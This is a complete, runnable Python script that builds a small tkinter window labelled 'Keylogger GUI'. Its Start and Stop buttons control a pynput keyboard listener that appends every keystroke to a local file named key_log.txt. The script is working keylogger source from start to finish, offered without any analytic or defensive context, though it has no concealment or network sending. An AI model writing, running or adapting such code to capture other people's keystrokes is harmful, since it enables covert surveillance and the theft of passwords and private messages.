import tkinter as tk
from pynput import keyboard
import threading

# File to store keystrokes
log_file = "key_log.txt"
listener = None  # Global listener

# Function to write keys
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'{key}\n')

# Start Keylogger
def start_logging():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    status_label.config(text="Status: Running")

# Stop Keylogger
def stop_logging():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
    status_label.config(text="Status: Stopped")

# Start thread to avoid GUI freeze
def start_thread():
    t = threading.Thread(target=start_logging)
    t.start()

# GUI
root = tk.Tk()
root.title("Keylogger GUI")
root.geometry("300x200")

tk.Label(root, text="Keylogger", font=("Arial", 16)).pack(pady=10)

status_label = tk.Label(root, text="Status: Stopped", fg="blue")
status_label.pack()

tk.Button(root, text="Start Logging", command=start_thread).pack(pady=10)
tk.Button(root, text="Stop Logging", command=stop_logging).pack()

root.mainloop()